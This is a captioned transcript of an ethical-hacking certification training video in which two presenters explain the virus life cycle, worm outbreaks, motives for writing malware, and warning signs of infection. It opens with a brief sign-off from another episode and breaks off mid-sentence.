00:39:00.710\n&gt;&gt; That's right.\n\n803\n00:39:00.710 --> 00:39:02.160\n&gt;&gt; So be careful with that.\n\n804\n00:39:02.160 --> 00:39:05.390\nIf it's too good to be true,\nit's probably too good to be true.\n\n805\n00:39:05.390 --> 00:39:06.900\nAll right then, we appreciate that.\n\n806\n00:39:06.900 --> 00:39:09.040\nWe hope everybody out\nthere enjoyed watching.\n\n807\n00:39:09.040 --> 00:39:11.590\nSigning off for ITProTV, I'm Mike Rodrick.\n\n808\n00:39:11.590 --> 00:39:15.945\n&gt;&gt; I am an interactive disassembler\nprogram, commonly known as IDA.\n\n809\n00:39:15.945 --> 00:39:17.225\n&gt;&gt; [LAUGH]\n&gt;&gt; My alter ego.\n\n810\n00:39:17.225 -->

00:00:19.580\nI'm your host Mike Rodrick and today we're\ndoing our Certified Ethical Hacker v9.\n\n4\n00:00:19.580 --> 00:00:24.210\nAnd specifically in this episode we're\ncontinuing our thought process on\n\n5\n00:00:24.210 --> 00:00:25.310\nmalware types.\n\n6\n00:00:25.310 --> 00:00:27.470\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n7\n00:00:27.470 --> 00:00:28.370\nHow are you doing Adam?\n\n8\n00:00:28.370 --> 00:00:30.110\n&gt;&gt; Good, good.\nI'm trying to stand still so\n\n9\n00:00:30.110 --> 00:00:31.385\nthat I don't get accused.\n\n10\n00:00:31.385 --> 00:00:32.970\n&gt;&gt; [LAUGH]\n&gt;&gt; By unnamed people\n\n11\n00:00:32.970 --> 00:00:34.780\nof popping in randomly on the screen.\n\n12\n00:00:34.780 --> 00:00:37.172\nSo other than that,\nI'm good now that I can move freely.\n\n13\n00:00:37.172 --> 00:00:38.030\n[SOUND]\n&gt;&gt; [NOISE]\n\n14\n00:00:38.030 --> 00:00:39.200\n&gt;&gt; Much better, okay.\n\n15\n00:00:39.200 --> 00:00:40.430\nSo [LAUGH] I am well.\n\n16\n00:00:40.430 --> 00:00:42.180\nHopefully everybody is also.\n\n17\n00:00:42.180 --> 00:00:46.000\nWe're gonna continue our conversations\nregarding malware as Mike was saying.\n\n18\n00:00:46.000 --> 00:00:50.080\nAnd I believe if I'm not mistaken\nthat we classified different types\n\n19\n00:00:50.080 --> 00:00:53.320\nof this particular insidious software.\n\n20\n00:00:53.320 --> 00:00:59.910\nViruses, worms, trojans, ransomware,\nadware, spyware, rootkits, encryptors.\n\n21\n00:00:59.910 --> 00:01:01.110\nAll as malware generic.\n\n22\n00:01:01.110 --> 00:01:04.320\nWe had that conversation in one\nof the earlier episodes we did.\n\n23\n00:01:04.320 --> 00:01:07.200\nWe've spent some time talking\nabout trojans in particular.\n\n24\n00:01:07.200 --> 00:01:08.890\nWe've shown you viruses.\n\n25\n00:01:08.890 --> 00:01:12.240\nMike was kind enough to take us\nout to a website, VirusTotal.\n\n26\n00:01:12.240 --> 00:01:14.720\nDid a little show and\ntell on some exploit code.\n\n27\n00:01:14.720 --> 00:01:17.420\nAnd have also done just a little show and\n\n28\n00:01:17.420 --> 00:01:21.475\ntell on how to disassemble what was\nnot clearly a virus in the real world.\n\n29\n00:01:21.475 --> 00:01:23.765\nBut in the real world may be virus code.\n\n30\n00:01:23.765 --> 00:01:28.105\nIn our little world here it was just a\nbenign little executable that volunteered\n\n31\n00:01:28.105 --> 00:01:29.430\nto be taken apart for us.\n\n32\n00:01:29.430 --> 00:01:30.895\n&gt;&gt; [LAUGH]\n&gt;&gt; But we took a look at some of that.\n\n33\n00:01:30.895 --> 00:01:33.690\nWe just want to spend\na little time in this episode\n\n34\n00:01:33.690 --> 00:01:35.070\nreally kind of wrapping up some things.\n\n35\n00:01:35.070 --> 00:01:37.730\nGoing through some additional\nconversational information.\n\n36\n00:01:37.730 --> 00:01:41.910\nTalking about different types of viruses,\nvirus characteristics,\n\n37\n00:01:41.910 --> 00:01:43.490\nwhat makes a virus a virus.\n\n38\n00:01:43.490 --> 00:01:47.378\nWe've talked about the fact that although\nit can copy itself, potentially changing\n\n39\n00:01:47.378 --> 00:01:50.407\nalong the way, that it does need\nhelp to be able to be transmitted.\n\n40\n00:01:50.407 --> 00:01:53.258\nSo when you're sick and\nyou sneeze for instance and\n\n41\n00:01:53.258 --> 00:01:57.913\npotentially get people sick around you,\nthe same idea would apply with the virus.\n\n42\n00:01:57.913 --> 00:02:02.530\nInstead except that we don't normally\nsneeze to spread computer viruses.\n\n43\n00:02:02.530 --> 00:02:05.110\nBut we did talk about baiting attacks for\ninstance, right?\n\n44\n00:02:05.110 --> 00:02:08.419\nWe spoke about the fact that we may\nleave infected media laying around and\n\n45\n00:02:08.419 --> 00:02:11.143\nas a result potentially spread\nthe virus that way, right?\n\n46\n00:02:11.143 --> 00:02:12.806\nSo just different things to consider.\n\n47\n00:02:12.806 --> 00:02:14.494\nAnd I think now you're being scolded for\n\n48\n00:02:14.494 --> 00:02:16.490\nthe same thing I was being scolded for\nearlier.\n\n49\n00:02:16.490 --> 00:02:17.098\nSo.\nHaha.\n\n50\n00:02:17.098 --> 00:02:19.428\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, anyway.\n\n51\n00:02:19.428 --> 00:02:20.466\nEnough of that here.\n\n52\n00:02:20.466 --> 00:02:22.300\nPut a gold star up on the board for\nme for that one.\n\n53\n00:02:22.300 --> 00:02:22.874\n&gt;&gt; Right?\n\n54\n00:02:22.874 --> 00:02:25.014\n[LAUGH]\n&gt;&gt; So virus characteristics, right?\n\n55\n00:02:25.014 --> 00:02:28.300\nMaking sure that we know that\nclearly viruses are malware.\n\n56\n00:02:28.300 --> 00:02:30.420\nThey will seek to infect other people.\n\n57\n00:02:30.420 --> 00:02:32.630\nOr other systems, sorry,\nnot so much other people.\n\n58\n00:02:32.630 --> 00:02:34.660\nBut normally they will seek to alter data.\n\n59\n00:02:34.660 --> 00:02:37.950\nAnd one of the key defining\ncharacteristics of malware in general\n\n60\n00:02:37.950 --> 00:02:40.240\nis that it seeks to infect and\ntake control.\n\n61\n00:02:40.240 --> 00:02:43.620\nBut as a subset of that, more often\nthan not, it will seek to infect and\n\n62\n00:02:43.620 --> 00:02:44.750\nthen modify.\n\n63\n00:02:44.750 --> 00:02:48.850\nAnd so as a result often\nviruses will modify files.\n\n64\n00:02:48.850 --> 00:02:50.410\nThey may delete files.\n\n65\n00:02:50.410 --> 00:02:53.140\nThey may change behavior in systems.\n\n66\n00:02:53.140 --> 00:02:55.708\nAnd along the way, of course,\ncause a lot of concern.\n\n67\n00:02:55.708 --> 00:02:58.750\nCorrupting files and\nprograms may be another example of\n\n68\n00:02:58.750 --> 00:03:01.870\nbehavior that that may show up as,\nor may occur.\n\n69\n00:03:01.870 --> 00:03:05.620\nWhen we think about the stages of a virus,\nwe often think about the virus life cycle.\n\n70\n00:03:05.620 --> 00:03:06.785\nWe talk a lot about life cycles.\n\n71\n00:03:06.785 --> 00:03:09.575\nThere is the data life cycle, in general.\n\n72\n00:03:09.575 --> 00:03:13.380\nThere are the various stages\nof incident response.\n\n73\n00:03:13.380 --> 00:03:16.060\nSo there's all these different\ncycles as security professionals we\n\n74\n00:03:16.060 --> 00:03:17.200\nhave to think about.\n\n75\n00:03:17.200 --> 00:03:20.570\nAnd the virus life cycle is one that\nwe should be familiar with as potential\n\n76\n00:03:20.570 --> 00:03:23.670\nCEH candidates looking\nultimately to certify.\n\n77\n00:03:23.670 --> 00:03:27.320\nThere are going to be a total of six\nsteps associated with, I say six and\n\n78\n00:03:27.320 --> 00:03:27.925\nI should do that.\n\n79\n00:03:27.925 --> 00:03:30.520\n&gt;&gt; [LAUGH]\n&gt;&gt; Six steps, from five fingers.\n\n80\n00:03:30.520 --> 00:03:33.250\nSix steps associated with\nthe stages of the virus life cycle.\n\n81\n00:03:33.250 --> 00:03:33.810\nDo you know?\n\n82\n00:03:33.810 --> 00:03:35.480\nIf you had to think,\nI know you don't know all six potentially.\n\n83\n00:03:35.480 --> 00:03:37.800\nBut if you had to think about\nthe first one would be?\n\n84\n00:03:37.800 --> 00:03:40.660\nWhat do you think the first one, what do\nwe have to do before we do anything else?\n\n85\n00:03:40.660 --> 00:03:41.860\n&gt;&gt; We've got to write the virus.\n\n86\n00:03:41.860 --> 00:03:43.352\n&gt;&gt; We've got to write it or\ndesign it, right?\n\n87\n00:03:43.352 --> 00:03:44.380\nCreate it, right, exactly.\nSomething like that.\n\n88\n00:03:44.380 --> 00:03:46.570\nSo we've got to design or\ncreate the virus.\n\n89\n00:03:46.570 --> 00:03:49.290\nBecause in the first place,\n\n90\n00:03:49.290 --> 00:03:52.400\nwe have to have something as an idea,\nbring that to life, so to speak.\n\n91\n00:03:52.400 --> 00:03:54.840\nWe did show you how to potentially\nwrite some very basic,\n\n92\n00:03:54.840 --> 00:03:56.570\nvery entry level exploit code.\n\n93\n00:03:56.570 --> 00:04:00.012\nThat really would not be considered\na virus by any stretch of the imagination.\n\n94\n00:04:00.012 --> 00:04:00.524\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n95\n00:04:00.524 --> 00:04:02.084\n&gt;&gt; But would be on its way towards\n\n96\n00:04:02.084 --> 00:04:05.324\nthe same kind of concepts, right.\nSo design would be important.\n\n97\n00:04:05.324 --> 00:04:06.604\nWe gotta design first.\n\n98\n00:04:06.604 --> 00:04:08.370\nAnd then we've gotta figure out ultimately\n\n99\n00:04:08.370 --> 00:04:12.680\nhow to get copies of that spread around\nbefore we actually launch the virus.\n\n100\n00:04:12.680 --> 00:04:16.620\nSo, step two, phase two in the life\ncycle would be to replicate.\n\n101\n00:04:16.620 --> 00:04:19.340\nAnd, then, step three would be to\nlaunch the virus, actually go live,\n\n102\n00:04:19.340 --> 00:04:22.230\nget it active,\nstart infecting some systems.\n\n103\n00:04:22.230 --> 00:04:28.190\nStep four really switches over into not\njust, hey let's get the virus out there,\n\n104\n00:04:28.190 --> 00:04:30.780\nlet's go ahead,\nlet's think about infecting systems.\n\n105\n00:04:30.780 --> 00:04:32.540\nBut now let's look at\nthe back end of that.\n\n106\n00:04:32.540 --> 00:04:34.060\nHow do we figure out we've been infected?\n\n107\n00:04:34.060 --> 00:04:36.420\nWhat do we do to potentially\nget rid of the virus?\n\n108\n00:04:36.420 --> 00:04:40.790\nCuz this is the stages of the virus\nlife cycle literally, creation to death.\n\n109\n00:04:40.790 --> 00:04:44.250\nAs opposed to, how do we create and\nall the stages associated with launching?\n\n110\n00:04:44.250 --> 00:04:48.480\nSo the first three are really about\ndesign, ultimately replication and launch,\n\n111\n00:04:48.480 --> 00:04:51.170\ninfection if you will,\ncreation to infection.\n\n112\n00:04:51.170 --> 00:04:54.790\nNow the last three are from\ninfection through removal.\n\n113\n00:04:54.790 --> 00:04:57.820\nAnd so we have to detect or\nat least think about detection.\n\n114\n00:04:57.820 --> 00:05:00.840\nWe have to incorporate things\nlike antivirus software,\n\n115\n00:05:00.840 --> 00:05:02.220\ndeveloper's anti-malware.\n\n116\n00:05:02.220 --> 00:05:05.380\nDevelopers have to incorporate knowledge\nof the virus into their platform.\n\n117\n00:05:05.380 --> 00:05:09.440\nTo now figure out how we can ultimately\ngo out and broadly spread news of this.\n\n118\n00:05:09.440 --> 00:05:10.660\nDetecting it in one system.\n\n119\n00:05:10.660 --> 00:05:13.360\nAnd maybe uploading it to VirusTotal or\n\n120\n00:05:13.360 --> 00:05:17.675\nany VAV websites to figure out we\nhave a new virus strain is important.\n\n121\n00:05:17.675 --> 00:05:21.095\nBut that's not the same thing\nas inoculating all the systems.\n\n122\n00:05:21.095 --> 00:05:24.893\nSo incorporation of that knowledge\ninto VAV vendors' databases\n\n123\n00:05:24.893 --> 00:05:27.585\nthrough signature updates is step five.\n\n124\n00:05:27.585 --> 00:05:28.472\nAnd then elimination.\n\n125\n00:05:28.472 --> 00:05:31.662\nStep six, where ultimately hopefully\neverybody starts scanning.\n\n126\n00:05:31.662 --> 00:05:34.432\nWe spread the news so to speak,\nof the virus being out there.\n\n127\n00:05:34.432 --> 00:05:37.562\nWe can get the better of it, and\nhopefully eradicate it over time.\n\n128\n00:05:37.562 --> 00:05:42.840\nSo design, replication, launch, detection,\nincorporation, and ultimately elimination.\n\n129\n00:05:42.840 --> 00:05:45.250\nGotta go the right way with the fingers\notherwise we'll end up with\n\n130\n00:05:45.250 --> 00:05:46.045\nthe wrong thing there.\n\n131\n00:05:46.045 --> 00:05:50.162\n&gt;&gt; [LAUGH] It's interesting though when\nyou say there's two separate parts of that\n\n132\n00:05:50.162 --> 00:05:52.890\nlife cycle, the replication and\nthe infection.\n\n133\n00:05:52.890 --> 00:05:56.340\nBecause a lot of us, I think,\nprobably see that as one step.\n\n134\n00:05:56.340 --> 00:06:00.710\nBut as a virus creator we don't\nnecessarily want it to infect right away\n\n135\n00:06:00.710 --> 00:06:03.930\nbecause need to get the virus\nonto more systems first.\n\n136\n00:06:03.930 --> 00:06:04.720\n&gt;&gt; We do.\nAnd also, and\n\n137\n00:06:04.720 --> 00:06:06.120\nyou raise a very good point about that.\n\n138\n00:06:06.120 --> 00:06:10.040\nIn addition, we also as the virus creator\nwrite, although we ultimately know yeah,\n\n139\n00:06:10.040 --> 00:06:10.875\nat some point, right?\n\n140\n00:06:10.875 --> 00:06:14.330\nSomebody's gonna probably figure this out,\nand maybe over time it will disappear.\n\n141\n00:06:14.330 --> 00:06:15.780\nSo we do envision, right?\n\n142\n00:06:15.780 --> 00:06:18.730\nThat the virus will go away, and\nwe have to be creating new viruses\n\n143\n00:06:18.730 --> 00:06:21.070\nin the pipeline just like\nthe drug manufacturers, right?\n\n144\n00:06:21.070 --> 00:06:22.970\nHave to do R&amp;D, right?\n\n145\n00:06:22.970 --> 00:06:25.716\n10, 20 years, billions of dollars\nto create a new drug and launch it.\n\n146\n00:06:25.716 --> 00:06:30.753\nThe VAV pipeline in terms of the bad\nactors that are out there doing malware.\n\n147\n00:06:30.753 --> 00:06:34.796\nAnd the AV pipeline, the good actors\ntrying to solve those problems,\n\n148\n00:06:34.796 --> 00:06:36.931\nare all trying to gain an advantage.\n\n149\n00:06:36.931 --> 00:06:40.410\nBy having multiple products\nout there simultaneously.\n\n150\n00:06:40.410 --> 00:06:44.452\nBut the reality is, most virus writers are\nnot thinking five steps ahead and saying,\n\n151\n00:06:44.452 --> 00:06:46.544\nwhat's going to happen when this one dies?\n\n152\n00:06:46.544 --> 00:06:49.734\nThey're thinking, okay I'm going to\ndesign it, put it out there, infect.\n\n153\n00:06:49.734 --> 00:06:53.690\nIn a kind of a stair step fashion, to your\npoint system so that I can gain advantage.\n\n154\n00:06:53.690 --> 00:06:57.060\nBut then I'm gonna really try to\nmaximize that, that's where they focus.\n\n155\n00:06:57.060 --> 00:07:00.326\nAnd so that break in the life cycle is\nreally about understanding that the bad\n\n156\n00:07:00.326 --> 00:07:02.650\nactors are focused on\nthe first three stages.\n\n157\n00:07:02.650 --> 00:07:05.360\nObviously the downside to them\nis the last three stages.\n\n158\n00:07:05.360 --> 00:07:08.160\nThe good actors are focused\non the last three stages and\n\n159\n00:07:08.160 --> 00:07:11.570\nreally can't operate in the last three\nuntil the first three have taken place.\n\n160\n00:07:11.570 --> 00:07:15.160\nBecause there is nothing for us to detect,\nultimately to figure out how to research\n\n161\n00:07:15.160 --> 00:07:18.940\nand incorporate and eradicate unless\nthe first three stages have taken place.\n\n162\n00:07:18.940 --> 00:07:21.702\nSo we actually kind of need each other.\n\n163\n00:07:21.702 --> 00:07:22.214\n&gt;&gt; [LAUGH]\n&gt;&gt; Right?\n\n164\n00:07:22.214 --> 00:07:23.854\nWe need the bad actors out there creating\n\n165\n00:07:23.854 --> 00:07:27.214\nviruses so we have something to do.\nAt least that's what I'm going with and\n\n166\n00:07:27.214 --> 00:07:29.404\nI'm saying is the case, right?\n&gt;&gt; [LAUGH]\n\n167\n00:07:29.404 --> 00:07:30.604\n&gt;&gt; So we just want to think about that.\n\n168\n00:07:30.604 --> 00:07:31.994\nClearly when we're thinking about\n\n169\n00:07:31.994 --> 00:07:35.164\ninfecting, we're thinking about crafting.\nAnd if somebody sits there maybe for\n\n170\n00:07:35.164 --> 00:07:38.254\nweeks or months on end.\nIs hacking away at writing code,\n\n171\n00:07:38.254 --> 00:07:40.944\nsampling it, trying it out,\nfiguring it out, refining it.\n\n172\n00:07:40.944 --> 00:07:42.254\nBefore they get it to the point where they\n\n173\n00:07:42.254 --> 00:07:44.570\nactually can go out and\nthey feel confident, right?\n\n174\n00:07:44.570 --> 00:07:46.620\nThat it will actually do\nwhat it's supposed to do.\n\n175\n00:07:46.620 --> 00:07:48.570\nSo this process can take a while.\n\n176\n00:07:48.570 --> 00:07:51.451\nAnd as Mike was saying, and\nhe raised a very good point as I said.\n\n177\n00:07:51.451 --> 00:07:54.404\nThinking about the fact that we may\nnot just push that out there and\n\n178\n00:07:54.404 --> 00:07:56.399\ntry to broadcast it as\nquickly as possible.\n\n179\n00:07:56.399 --> 00:08:00.530\nBut selectively we're gonna start\ninfecting to build reservoirs, right?\n\n180\n00:08:00.530 --> 00:08:04.299\nAnd ultimately have a place\nwhere that virus is gonna sit.\n\n181\n00:08:04.299 --> 00:08:06.365\nAnd if you think about\nnot just the virus but\n\n182\n00:08:06.365 --> 00:08:09.820\nthink about a worm on the flip side\nof this, which will self propagate.\n\n183\n00:08:09.820 --> 00:08:13.540\nWe release it into the wild essentially\nand if it's done the right way that thing\n\n184\n00:08:13.540 --> 00:08:17.180\nwill just take of and the vector for\ninfection sky rockets.\n\n185\n00:08:17.180 --> 00:08:21.435\nIf you remember slammer, code red,\nsome of these SQL worms, for instance,\n\n186\n00:08:21.435 --> 00:08:24.200\nare propagated through online databases.\n\n187\n00:08:24.200 --> 00:08:28.200\nThe minute you would bring a database up\nyou couldn't even hit next fast enough\n\n188\n00:08:28.200 --> 00:08:31.390\nright after install and it would already\nbe, at the height of these infections,\n\n189\n00:08:31.390 --> 00:08:34.750\nit would already be basically tagged and\ninfected because there were so\n\n190\n00:08:34.750 --> 00:08:39.140\nmany of these systems out there\nthat were still holding the worm.\n\n191\n00:08:39.140 --> 00:08:40.480\nThat by the time we actually said,\n\n192\n00:08:40.480 --> 00:08:44.440\nokay, yeah let's try to build a defensive\nperimeter here and let's firewall\n\n193\n00:08:44.440 --> 00:08:48.260\nourselves off, unless we cut ourselves\noff from the Internet totally,\n\n194\n00:08:48.260 --> 00:08:52.490\nwhich was the only way to stop the spread\nof this stuff at a certain point.\n\n195\n00:08:52.490 --> 00:08:55.653\nI remember at the height of these\ninfections bringing systems up in\n\n196\n00:08:55.653 --> 00:08:57.752\nclassrooms or at client sites or whatever.\n\n197\n00:08:57.752 --> 00:09:01.442\nAnd literally, sometimes we bring them up,\nand by the time that they actually come\n\n198\n00:09:01.442 --> 00:09:04.090\nonline, services started,\nthey were already infected.\n\n199\n00:09:04.090 --> 00:09:06.430\n&gt;&gt; Wow.\n&gt;&gt; So you're talking about 30 seconds,\n\n200\n00:09:06.430 --> 00:09:10.230\na minute hooked up to the Internet,\nand there were just thousands,\n\n201\n00:09:10.230 --> 00:09:13.440\ntens of thousands of machines\nscanning out there, looking.\n\n202\n00:09:13.440 --> 00:09:17.516\nAnd then immediately launching worms at\nthe attacks were just coming fast and\n\n203\n00:09:17.516 --> 00:09:18.086\nfurious.\n\n204\n00:09:18.086 --> 00:09:19.760\n&gt;&gt; Wow.\n&gt;&gt; So it could be a really big issue.\n\n205\n00:09:19.760 --> 00:09:21.610\nIt's definitely something to think about,\nright?\n\n206\n00:09:21.610 --> 00:09:26.171\nSo, we often ask, and we talk about the\nfact that people have a variety of reasons\n\n207\n00:09:26.171 --> 00:09:30.347\nfor creating computer viruses, and\nthere's any number of reasons why.\n\n208\n00:09:30.347 --> 00:09:32.615\n[COUGH] When you think about, ultimately,\n\n209\n00:09:32.615 --> 00:09:35.576\nthe fact that people seek to\ngain advantage in some way,\n\n210\n00:09:35.576 --> 00:09:39.550\nwhether it's financial advantage,\nwhether it is an act of retribution.\n\n211\n00:09:39.550 --> 00:09:43.670\nYou wronged me, I'm gonna get you back,\nthat kind of thing, whatever it may be.\n\n212\n00:09:43.670 --> 00:09:45.710\nMaybe it's a research project gone arise.\n\n213\n00:09:45.710 --> 00:09:48.610\nSomebody's creating code\ndoesn't realize what it can do.\n\n214\n00:09:48.610 --> 00:09:50.950\nThat's how the Morris worm\nwas launched ultimately.\n\n215\n00:09:50.950 --> 00:09:54.930\n&gt;&gt; Really?\n&gt;&gt; Very very first major worm, first major\n\n216\n00:09:54.930 --> 00:09:59.340\nmalware attack if you will of our era,\nwas launched inadvertently.\n\n217\n00:09:59.340 --> 00:10:03.650\nRobert Morris, the man behind the worm\ndid this as a research project and\n\n218\n00:10:03.650 --> 00:10:05.410\nit got out of captivity essentially.\n\n219\n00:10:05.410 --> 00:10:06.460\nAnd at the time.\n\n220\n00:10:06.460 --> 00:10:10.000\nTo this day is actually still the most\nsuccessful attack that ever occurred.\n\n221\n00:10:10.000 --> 00:10:13.160\nPropagated out and\nspread to almost every node at that time,\n\n222\n00:10:13.160 --> 00:10:15.850\nwhich was a very small\nnumber by comparison today.\n\n223\n00:10:15.850 --> 00:10:17.260\nOn what was then the Internet,\n\n224\n00:10:17.260 --> 00:10:21.010\nwhich was primarily a research network for\nacademics and the military.\n\n225\n00:10:21.010 --> 00:10:21.646\nBut he touched and\n\n226\n00:10:21.646 --> 00:10:24.325\naffected almost every system on the planet\nthat was connected at the time.\n\n227\n00:10:24.325 --> 00:10:25.488\n&gt;&gt; Wow.\n&gt;&gt; When this worm\n\n228\n00:10:25.488 --> 00:10:29.240\ngot out before they actually finally\nfigured it out and put a stop to it.\n\n229\n00:10:29.240 --> 00:10:30.580\nSo these things can happen.\n\n230\n00:10:30.580 --> 00:10:33.270\nI mean, it's not necessarily\nthat everybody is up to no good.\n\n231\n00:10:33.270 --> 00:10:36.650\nAnd it's that this is the cyber\nattack that we're facing.\n\n232\n00:10:36.650 --> 00:10:40.450\nBut the reality is that people have a\nvariety of reasons for doing these things.\n\n233\n00:10:40.450 --> 00:10:43.520\nSo we just have to think about this and,\nyou know, regardless of what it is,\n\n234\n00:10:43.520 --> 00:10:45.570\nwe have to take action and\nwe have to try to stop it.\n\n235\n00:10:45.570 --> 00:10:48.960\nBut sometimes understanding the root\ncause may or may not be helpful.\n\n236\n00:10:48.960 --> 00:10:51.680\nJust knowing that it's there probably is,\nyou know, the big thing.\n\n237\n00:10:51.680 --> 00:10:53.230\nKeep in mind there's a lot\na lot of warning signs.\n\n238\n00:10:53.230 --> 00:10:54.710\nRight?\nYou know we often joke about and\n\n239\n00:10:54.710 --> 00:10:56.420\nhear that users are complaining.\n\n240\n00:10:56.420 --> 00:10:58.266\nSystems are running slow.\n\n241\n00:10:58.266 --> 00:11:00.020\nI get these strange pop-ups.\n\n242\n00:11:00.020 --> 00:11:01.710\nYou know things don't look right.\n\n243\n00:11:01.710 --> 00:11:05.500\nYou know a lot of the times that stuff\nis very important to pay attention to.\n\n244\n00:11:05.500 --> 00:11:07.170\nLet me say all the time, unequivocally,\n\n245\n00:11:07.170 --> 00:11:11.210\nit's important to pay attention to because\na lot times those front end users,\n\n246\n00:11:11.210 --> 00:11:14.490\nthose people that are on the front lines,\nare gonna be seeing the infection first\n\n247\n00:11:14.490 --> 00:11:16.490\nhand even though they may\nnot realize what it is.\n\n248\n00:11:16.490 --> 00:11:20.164\nWe have to take seriously the indications\nof the fact that they feel that there may\n\n249\n00:11:20.164 --> 00:11:21.257\nbe something going on.\n\n250\n00:11:21.257 --> 00:11:24.565\nIf you get these strange pop-ups,\nand somebody says, hey,\n\n251\n00:11:24.565 --> 00:11:28.540\nI got a prompt to reset my password,\nshould I have clicked on that?\n\n252\n00:11:28.540 --> 00:11:31.340\nYou obviously clearly know,\nbut if they do,\n\n253\n00:11:31.340 --> 00:11:33.490\nwe gotta know that because\nmaybe there's malware there.\n\n254\n00:11:33.490 --> 00:11:34.770\nMaybe there's a rootkit.\n\n255\n00:11:34.770 --> 00:11:37.216\nMaybe somebody's been\ninfected by a drive by.\n\n256\n00:11:37.216 --> 00:11:37.904\nWho knows what?\n\n257\n00:11:37.904 --> 00:11:40.836\nI mean there's so many ways this stuff\nspreads today, as we've talked about.\n\n258\n00:11:40.836 --> 00:11:45.717\nYou can't load operating systems,\nif you can't do patching, so\n\n259\n00:11:45.717 --> 00:11:48.460\nupdating and patch management.\n\n260\n00:11:48.460 --> 00:11:52.670\nIf there's no display on the system,\nyou know, the thing's flickering,\n\n261\n00:11:52.670 --> 00:11:53.770\nyou get random stuff.\n\n262\n00:11:53.770 --> 00:11:57.400\nObviously, the laughing Jolly Roger\nhad flashing neon signs,\n\n263\n00:11:57.400 --> 00:11:59.680\nthat's a good indication\nyou may have a virus.\n\n264\n00:11:59.680 --> 00:12:02.040\nJust in case you were\nwondering about that one.\n\n265\n00:12:02.040 --> 00:12:05.720\nBut ,you know, processes take a very\nlong time, system is sluggish.\n\n266\n00:12:05.720 --> 00:12:07.130\nYou try to load certain things or\n\n267\n00:12:07.130 --> 00:12:10.200\nlaunch certain things like AV\nsoftware you can't do that.\n\n268\n00:12:10.200 --> 00:12:13.960\nThese are warning signs obviously\nwhole directories are missing\n\n269\n00:12:13.960 --> 00:12:15.350\nthings of that nature.\n\n270\n00:12:15.350 --> 00:12:16.800\nThe browse window freezes,\n\n271\n00:12:16.800 --> 00:12:20.350\nthe hard drive is ratcheting all\nthe time just constantly going.\n\n272\n00:12:20.350 --> 00:12:26.388\nThese are all signs of the fact that you\nhave most likely been infected by a virus.\n\n273\n00:12:26.388 --> 00:12:28.570\nThere are no such things\nas ghosts in the machines.\n\n274\n00:12:28.570 --> 00:12:32.369\nThere are no gremlins that run around,\ncontrary to what people tell me.\n\n275\n00:12:32.369 --> 00:12:34.800\nAnd that is indicative of something,\nright?\n\n276\n00:12:34.800 --> 00:12:36.560\nInstalling pirated software.\n\n277\n00:12:36.560 --> 00:12:39.210\nDownloading software from unknown sites.\n\n278\n00:12:39.210 --> 00:12:40.180\nObviously, attachments.\n\n279\n00:12:40.180 --> 00:12:43.420\nWe've talked about the importance of\ndealing with those kind of things.\n\n280\n00:12:43.420 --> 00:12:45.000\nAny system that's not scanned.\n\n281\n00:12:45.000 --> 00:12:48.440\nAny system that's allowed to access\nthe Internet without several layers of\n\n282\n00:12:48.440 --> 00:12:50.870\nprotection is potentially\ngoing to be compromised.\n\n283\n00:12:50.870 --> 00:12:52.510\nIt's a only a matter of time.\n\n284\n00:12:52.510 --> 00:12:55.070\nAnd we have to think about the fact that,\nyou know?\n\n285\n00:12:55.070 --> 00:12:56.620\nIf we're playing games.\n\n286\n00:12:56.620 --> 00:12:59.060\nBy allowing systems to\naccess the Internet or\n\n287\n00:12:59.060 --> 00:13:03.450\nany kind of external network without\nmultiple layers of protection,\n\n288\n00:13:03.450 --> 00:13:06.780\nwe shouldn't be surprised when bad things\nhappen and we should not bemoan our fate.\n\n289\n00:13:06.780 --> 00:13:09.260\nBut we should assume, obviously,\nthat that's gonna be the case.\n\n290\n00:13:09.260 --> 00:13:12.940\nNow, if we're up to the thought process\nwhere we're building a honeypot or\n\n291\n00:13:12.940 --> 00:13:13.580\na honeynet.\n\n292\n00:13:13.580 --> 00:13:15.304\nAnd we're gonna purposely infect systems,\n\n293\n00:13:15.304 --> 00:13:18.170\nthat's a different story cuz that's\nsomething we may wanna have happen.\n\n294\n00:13:18.170 --> 00:13:21.500\nBut unless you're doing that and\nyou're in that particular business,\n\n295\n00:13:21.500 --> 00:13:25.050\nthen you should not be running systems\nwithout these protections in place.\n\n296\n00:13:25.050 --> 00:13:29.519\nYou know, what I'm constantly amazed\nat the number of people that run\n\n297\n00:13:29.519 --> 00:13:33.763\nsystems without these protections,\nand then will turn around and\n\n298\n00:13:33.763 --> 00:13:37.722\nsay, well why did that happen to me,\nand why wasn't I known?\n\n299\n00:13:37.722 --> 00:13:39.900\nAnd rather,\nwhy wasn't it known that I was doing that?\n\n300\n00:13:39.900 --> 00:13:42.180\nWell, we may have known that you\nwere doing that, but the reality is,\n\n301\n00:13:42.180 --> 00:13:44.700\nwe tell you that there are certain\nthings you have to do.\n\n302\n00:13:44.700 --> 00:13:46.280\nRight?\nAnd if you don't do them,\n\n303\n00:13:46.280 --> 00:13:48.390\nthen at the end of the day,\nwhose fault is that?\n\n304\n00:13:48.390 --> 00:13:48.990\nRight?\n\n305\n00:13:48.990 --> 00:13:50.970\nYou know,\nI often talk about caveat emptor, right?\n\n306\n00:13:50.970 --> 00:13:52.075\nBuyer beware.\n\n307\n00:13:52.075 --> 00:13:53.830\nYour, eyes wide open\nis the way to go here.\n\n308\n00:13:53.830 --> 00:13:55.070\nIf we warn you about something,\n\n309\n00:13:55.070 --> 00:13:58.980\nas a security professional, there's\na reason, right, that we tell you this.\n\n310\n00:13:58.980 --> 00:14:00.410\nI mean, we've got other stuff to do, and\n\n311\n00:14:00.410 --> 00:14:02.750\nwarning you is not the only\nthing that we spend time on.\n\n312\n00:14:02.750 --> 00:14:04.810\nAnd we can't keep circling\nback to it time in again.\n\n313\n00:14:04.810 --> 00:14:08.320\nSo, you've got to understand, [INAUDIBLE]\nware can obviously be a problem,\n\n314\n00:14:08.320 --> 00:14:11.370\nif somebody infects your machine,\nlooking to gain advantage,\n\n315\n00:14:11.370 --> 00:14:14.780\npotentially encrypting your drive and\nthen holding it ransom.\n\n316\n00:14:14.780 --> 00:14:19.170\nThis is something to consider, we've had\nseveral instances In recent years where\n\n317\n00:14:19.170 --> 00:14:22.850\nhospitals and health care providers have\nfallen prey to this, some of them have\n\n318\n00:14:22.850 --> 00:14:26.760\nessentially, politely told the hackers\nforget it, go jump in a lake.\n\n319\n00:14:26.760 --> 00:14:28.950\nWe're not paying you and\nwe'll figure it out 